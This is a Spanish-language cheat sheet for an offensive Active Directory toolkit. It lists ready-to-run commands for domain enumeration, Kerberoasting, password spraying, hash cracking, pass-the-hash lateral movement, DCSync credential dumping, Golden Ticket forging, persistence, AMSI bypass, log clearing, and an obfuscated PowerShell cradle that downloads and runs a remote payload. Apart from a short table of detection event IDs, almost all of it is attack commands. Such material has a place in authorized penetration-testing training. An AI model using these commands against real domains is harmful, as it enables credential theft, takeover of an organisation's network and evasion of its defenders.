# ⚔️ Ciber-AD — Cheat Sheet de comandos

Referencia rápida de todos los comandos del repositorio.

---

## 🔍 Reconocimiento

```bash
# Enumeración completa del dominio
python3 01-Reconocimiento/scripts/ad_enum.py --dc DC_IP --domain dominio.local -u user -p pass

# CrackMapExec — info básica del DC
crackmapexec smb DC_IP -u user -p pass -d dominio.local

# Enumerar usuarios
crackmapexec ldap DC_IP -u user -p pass --users

# Enumerar grupos
crackmapexec ldap DC_IP -u user -p pass --groups

# BloodHound — recolección de datos
bloodhound-python -d dominio.local -u user -p pass -ns DC_IP -c All

# LDAP directo
ldapsearch -x -H ldap://DC_IP -D user@dominio.local -w pass -b "DC=dominio,DC=local" "(objectClass=user)" cn sAMAccountName
```

---

## 🎫 Kerberos

```bash
# Kerberoasting — capturar hashes TGS
impacket-GetUserSPNs dominio.local/user:pass -dc-ip DC_IP -request -outputfile kerberoast.txt

# AS-REP Roasting — sin credenciales
impacket-GetNPUsers dominio.local/usuario -dc-ip DC_IP -no-pass -format hashcat -outputfile asrep.txt

# AS-REP con lista de usuarios
impacket-GetNPUsers dominio.local/ -dc-ip DC_IP -usersfile users.txt -no-pass -format hashcat

# Crackear Kerberoast
hashcat -m 13100 kerberoast.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Crackear AS-REP
hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# Script propio
python3 02-Kerberos/scripts/kerberoast.py --dc DC_IP --domain dominio.local -u user -p pass
```

---

## 🔑 Credenciales

```bash
# Password Spraying — CrackMapExec
crackmapexec smb DC_IP -u users.txt -p 'Empresa2024!' -d dominio.local --continue-on-success

# Password Spraying — Kerbrute (mas silencioso, usa Kerberos)
kerbrute passwordspray -d dominio.local --dc DC_IP users.txt 'Empresa2024!'

# Verificar credencial
crackmapexec smb DC_IP -u usuario -p 'contraseña' -d dominio.local

# Generar wordlist corporativa
python3 03-Credenciales/scripts/credential_attack.py wordlist --company "Empresa" --year 2024

# Credential Dumping remoto (requiere DA)
impacket-secretsdump dominio.local/Administrador:'pass'@DC_IP -just-dc-ntlm

# Responder — capturar hashes NTLMv2 en la red
sudo responder -I eth0 -wF

# Crackear NTLMv2
hashcat -m 5600 ntlmv2.txt /usr/share/wordlists/rockyou.txt
```

---

## 🔄 Movimiento Lateral

```bash
# Pass-the-Hash con PSExec (shell SYSTEM)
impacket-psexec dominio.local/Administrador@192.168.1.41 -hashes :HASH_NT

# PTH con WMIExec (sin crear servicio, mas silencioso)
impacket-wmiexec dominio.local/Administrador@192.168.1.41 -hashes :HASH_NT

# PTH con Evil-WinRM (WinRM, puerto 5985)
evil-winrm -i 192.168.1.41 -u Administrador -H HASH_NT

# Escanear red con credenciales
crackmapexec smb 192.168.1.0/24 -u Administrador -p 'pass' --continue-on-success

# Ejecutar comando en múltiples hosts
crackmapexec smb 192.168.1.0/24 -u Administrador -p 'pass' -x "whoami"

# Script propio
python3 04-Lateral-Movement/scripts/lateral_move.py scan --range 192.168.1.0/24 --domain dominio.local -u user -p pass
```

---

## 📈 Escalada de Privilegios

```bash
# Enumerar vectores de escalada
python3 05-Privilege-Escalation/scripts/privesc_scanner.py --dc DC_IP --domain dominio.local -u user -p pass

# Ver ACLs peligrosas con BloodHound
bloodhound-python -d dominio.local -u user -p pass -ns DC_IP -c ACL

# LAPS — leer contraseñas de admin local
crackmapexec ldap DC_IP -u user -p pass --laps

# Unconstrained Delegation
crackmapexec ldap DC_IP -u user -p pass --trusted-for-delegation
```

---

## 👑 Domain Dominance

```bash
# DCSync — volcar todos los hashes del dominio
impacket-secretsdump dominio.local/Administrador:'pass'@DC_IP -just-dc-ntlm

# DCSync solo krbtgt
impacket-secretsdump dominio.local/Administrador:'pass'@DC_IP -just-dc-user krbtgt

# Obtener SID del dominio
impacket-getPac dominio.local/user:pass@DC_IP

# Golden Ticket
impacket-ticketer -nthash HASH_KRBTGT -domain-sid S-1-5-21-XXX -domain dominio.local -user "FalseAdmin" -groups 512 golden_ticket

# Usar Golden Ticket
export KRB5CCNAME=golden_ticket.ccache
impacket-psexec -k -no-pass dominio.local/FalseAdmin@DC01.dominio.local

# Script propio
python3 06-Domain-Dominance/scripts/domain_pwn.py dcsync --dc DC_IP --domain dominio.local -u Admin -p pass
```

---

## 🔒 Persistencia

```bash
# Ver ticket activo
klist
python3 07-Persistencia/scripts/persistence.py check-ticket

# Info Golden Ticket
python3 07-Persistencia/scripts/persistence.py golden --domain dominio.local

# AdminSDHolder abuse (instrucciones)
python3 07-Persistencia/scripts/persistence.py adminsdholder --domain dominio.local --user usuario_controlado
```

---

## 🥷 Evasión

```bash
# AMSI bypass payloads
python3 08-Evasion/scripts/evasion_toolkit.py amsi

# Ofuscar comando PowerShell en Base64
python3 08-Evasion/scripts/evasion_toolkit.py obfuscate --cmd "IEX(New-Object Net.WebClient).DownloadString('http://IP/payload.ps1')"

# Living off the Land commands
python3 08-Evasion/scripts/evasion_toolkit.py lotl --target 192.168.1.41 --cmd "cmd.exe"

# Comandos de borrado de logs
python3 08-Evasion/scripts/evasion_toolkit.py clear-logs
```

---

## 🔢 Event IDs para detección (Blue Team)

| Event ID | Ataque | Log |
|----------|--------|-----|
| 4769 | Kerberoasting (EncryptionType 0x17) | Security |
| 4768 | AS-REP Roasting (Pre-auth Type 0) | Security |
| 4662 | DCSync (replicación desde IP no-DC) | Security |
| 4624 | Logon exitoso (ver Logon Type) | Security |
| 4771 | Fallo de pre-auth Kerberos | Security |
| 4776 | NTLM Auth (detectar PTH) | Security |
| 4698 | Scheduled Task creada | Security |
| 5136 | Modificación de objeto AD | Security |
| 1102 | Log de seguridad borrado | Security |
| 4104 | Script Block Logging (PowerShell) | PowerShell |

---

## 📁 Scripts del repo

| Script | Módulo | Uso principal |
|--------|--------|---------------|
| `ad_enum.py` | Reconocimiento | Enumerar AD completo + attack paths |
| `kerberoast.py` | Kerberos | Kerberoasting vía Impacket |
| `credential_attack.py` | Credenciales | Password spray + wordlist corporativa |
| `lateral_move.py` | Lateral Move | Scan red + PTH + exec remoto |
| `privesc_scanner.py` | Escalada | ACLs peligrosas + Delegation + LAPS |
| `domain_pwn.py` | Dominance | DCSync + Golden Ticket |
| `persistence.py` | Persistencia | Golden Ticket + AdminSDHolder |
| `evasion_toolkit.py` | Evasión | AMSI bypass + obfuscation + LOtL |
